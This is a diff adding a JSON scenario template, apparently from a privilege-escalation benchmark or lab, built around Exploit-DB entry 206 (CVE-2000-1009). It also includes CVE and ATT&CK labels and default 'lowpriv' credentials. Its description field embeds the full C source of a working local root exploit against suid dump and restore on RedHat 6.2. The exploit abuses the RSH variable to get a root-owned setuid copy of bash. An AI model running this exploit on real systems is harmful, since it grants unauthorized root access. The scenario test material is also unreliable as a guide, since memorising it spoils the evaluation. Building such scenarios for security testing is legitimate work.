@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_206",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: dump 0.4b15 (RedHat 6.2) - Local Privilege Escalation (OSVDB-13747;CVE-2000-1009)\n\nExploit source code (206.c):\n```\n/*\n**\n**  dump-0.4b15x.c\n**\n**  dump-0.4b15 exploit:\n**  Redhat 6.2 dump command executes\n**  external program with suid priviledge.\n**\n**  affected:\n**     /sbin/dump\n**     /sbin/dump.static\n**     /sbin/restore\n**     /sbin/restore.static\n**\n**  Bug found by mat@hacksware.com\n**\n**  This example was coded by md0claes@mdstud.chalmers.se\n**  It was written for EDUCATIONAL PURPOSES ONLY.\n**\n**\n*/\n\n#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <errno.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n\n#define RUNME     \"/tmp/runme\"      \t/* tmp file\t\t   */\n#define SUID_PATH \"/tmp/superdude\"\t\t/* the power of root */\n\nvoid usage(char *pname)\n{\n fprintf(stdout, \"\\nUsage: %s < d | s | r | p >\\n\\n\", pname);\n fprintf(stdout,   \"  d - exploit /sbin/dump\\n\");\n fprintf(stdout,   \"  s - exploit /sbin/dump.static\\n\");\n fprintf(stdout,   \"  r - exploit /sbin/restore\\n\");\n fprintf(stdout,   \"  p - exploit /sbin/restore.static\\n\\n\");\n}\n\nint main(int argc, char *argv[], char *envp[])\n{\n int fd;\n pid_t pid;\n char *bad_env[] = { \"TAPE=garbage:garbage\", \"RSH=\"RUNME };\n char   runbuf[] = { \"#!/bin/sh\\n/bin/cp /bin/bash \"\n                    SUID_PATH \"\\nchmod 6755 \" SUID_PATH };\n\n char *suid[] = { SUID_PATH, NULL };\n char   *av[] = { \"/sbin/restore.static\", \"restore.static\",\n                  \"-t\", \"/tmp/foo\" };\n\n if (argc != 2) {\n  usage(argv[0]);\n  exit(1);\n }\n\n switch(tolower(argv[1][0])) {\n\n  case 'd':\n   av[0] = \"/sbin/dump\";\n   av[1] = \"dump\";\n   av[2] = \"-0\";\n   av[3] = \"/\";\n   break;\n\n  case 's':\n   av[0] = \"/sbin/dump.static\";\n   av[1] = \"dump.static\";\n   av[2] = \"-0\";\n   av[3] = \"/\";\n   break;\n\n  case 'r':\n   av[0] = \"/sbin/restore\";\n   av[1] = \"restore\";\n   break;\n\n  case 'p':\n   break;\n\n  default:\n   usage(argv[0]);\n   exit(1);\n }\n\n if ((fd = open(RUNME,O_WRONLY|O_CREAT|O_TRUNC, 0755)) == -1) {\n  perror(\"fopen\");\n  exit(1);\n }\n\n if (write(fd, runbuf, sizeof(runbuf)) == -1) {\n  perror(\"write\");\n  exit(1);\n }\n close(fd);\n\n if ((pid = fork()) < 0) {\n  perror(\"fork\");\n  exit(1);\n }\n\n else if (pid == 0) {\n  if (execle(av[0], av[1], av[2], av[3], NULL, bad_env) < 0) {\n   perror(\"execle\");\n   _exit(1);\n  }\n }\n\n sleep(1);\n unlink(RUNME);\n fprintf(stdout, \"\\nExploited %s \\n\", av[0]);\n fprintf(stdout, \"Running \" SUID_PATH \"\\n\");\n execve(SUID_PATH, suid, envp);\n\n exit(0);\n}\n\n\n// milw0rm.com [2000-11-29]\n```",
+  "cve": "OSVDB-13747;CVE-2000-1009",
+  "exploitdb_id": "206",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_206",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
